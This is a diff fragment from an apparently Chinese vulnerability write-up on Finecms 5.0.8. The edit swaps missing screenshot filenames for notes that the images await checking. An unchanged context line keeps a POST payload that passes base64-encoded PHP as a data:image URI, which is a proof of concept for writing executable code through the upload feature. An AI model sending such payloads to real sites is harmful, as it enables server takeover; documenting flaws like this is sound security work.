@@ -61,9 +61,9 @@ Finecms 5.0.8
 
     POST：tx=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+
 
-2.png
+> **图片待核**：原归档在此处仅保留文件名 `2.png`，没有可对应的图片引用。
 
-3.png
+> **图片待核**：原归档在此处仅保留文件名 `3.png`，没有可对应的图片引用。
 
 参考链接
 --------
